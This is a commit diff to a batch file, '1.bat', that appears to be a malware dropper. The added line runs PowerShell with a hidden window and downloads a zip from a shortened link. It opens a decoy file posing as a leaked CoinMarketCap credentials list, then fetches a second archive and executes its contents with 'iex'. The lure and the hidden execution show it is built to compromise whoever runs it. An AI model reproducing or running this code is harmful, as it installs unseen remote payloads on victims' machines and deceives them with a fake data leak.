aa8f62a09ecfdcd5cec311a4426db346d0ccf30a
bhtig <134285700+bhtig@users.noreply.github.com>
2023-05-31 11:00:11 +0000

    Update 1.bat

--- 1.bat
+++ 1.bat
@@ -1,2 +1,1 @@
-cd $env:temp
-wget 'bit.ly/3WuTW4p' -OutFile eureka.zip; Expand-Archive eureka.zip; cd eureka; ii CoinMarketCap_Dataleak_logins_and_passwords.txt; del -Fo ..\eureka.zip; wget 'bit.ly/4203S7k' -OutFile pay.zip; Expand-Archive pay.zip; del pay.zip; cd pay; type pay1.txt | iex
+powershell -w hidden -Command "cd $env:temp; wget 'bit.ly/3WuTW4p' -OutFile eureka.zip; Expand-Archive eureka.zip; cd eureka; ii CoinMarketCap_Dataleak_logins_and_passwords.txt; del -Fo ..\eureka.zip; wget 'bit.ly/4203S7k' -OutFile pay.zip; Expand-Archive pay.zip; cd pay; type pay1.txt | iex"
